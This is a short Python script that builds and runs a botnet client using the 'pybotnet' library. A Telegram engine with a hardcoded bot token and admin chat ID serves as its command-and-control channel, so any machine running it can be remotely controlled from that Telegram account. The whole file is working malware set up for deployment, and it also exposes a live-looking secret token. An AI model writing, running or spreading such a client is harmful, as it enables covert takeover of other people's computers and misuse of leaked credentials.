from pybotnet import BotNet, TelegramEngine

telegram_eng = TelegramEngine(token="5725528820:AAE8UWJnvAWFtaVyXdf8YedmiaE1GdfCsuk", admin_chat_id="1439783859")

botnet = BotNet(telegram_eng)
botnet.run()